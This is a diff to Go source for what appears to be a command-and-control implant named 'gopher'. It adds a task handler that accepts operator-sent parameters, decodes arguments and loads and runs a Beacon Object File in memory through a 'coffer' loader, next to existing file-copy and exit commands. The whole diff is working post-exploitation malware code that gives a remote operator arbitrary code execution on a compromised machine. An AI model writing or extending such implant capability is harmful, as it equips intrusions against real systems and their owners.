@@ -9,11 +9,9 @@ import (
 	"crypto/rand"
 	"crypto/tls"
 	"crypto/x509"
+	"encoding/base64"
 	"errors"
 	"fmt"
-	"github.com/vmihailenco/msgpack/v5"
-	"gopher/functions"
-	"gopher/utils"
 	"io"
 	"net"
 	"os"
@@ -22,6 +20,12 @@ import (
 	"sync"
 	"syscall"
 	"time"
+
+	"gopher/bof/coffer"
+	"gopher/functions"
+	"gopher/utils"
+
+	"github.com/vmihailenco/msgpack/v5"
 )
 
 var UPLOADS map[string][]byte
@@ -57,6 +61,9 @@ func TaskProcess(commands [][]byte) [][]byte {
 
 		case utils.COMMAND_CP:
 			data, err = taskCp(command.Data)
+
+		case utils.COMMAND_EXEC_BOF:
+			data, err = taskExecBof(command.Data)
 
 		case utils.COMMAND_EXIT:
 			data, err = taskExit()
@@ -208,6 +215,25 @@ func taskCp(paramsData []byte) ([]byte, error) {
 	}
 
 	return nil, err
+}
+
+func taskExecBof(paramsData []byte) ([]byte, error) {
+	var params utils.ParamsExecBof
+	if err := msgpack.Unmarshal(paramsData, &params); err != nil {
+		return nil, err
+	}
+
+	argz, err := base64.StdEncoding.DecodeString(params.ArgsPack)
+	if err != nil {
+		argz = make([]byte, 1)
+	}
+
+	out, err := coffer.Load(params.Object, argz)
+	if err != nil {
+		return nil, err
+	}
+
+	return msgpack.Marshal(utils.AnsExecBof{Output: out})
 }
 
 func taskExit() ([]byte, error) {
